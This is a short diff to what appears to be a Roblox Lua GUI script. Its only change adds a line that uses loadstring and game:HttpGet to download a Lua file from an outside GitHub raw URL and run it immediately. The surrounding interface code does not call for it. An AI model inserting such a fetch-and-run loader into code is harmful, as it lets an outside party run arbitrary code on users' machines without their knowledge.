@@ -536,7 +536,8 @@ formmastery.brand_Stroke:Destroy()
 addstroke(destroygui, Color3.new(1,0,0), "Border", 2)
 
 wait(.01)
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fernando6663535/Lua/main/CONNOMETRO.lua"))()
+                
 
 local c = Color3.new(1,0,1)
 spawn(function()
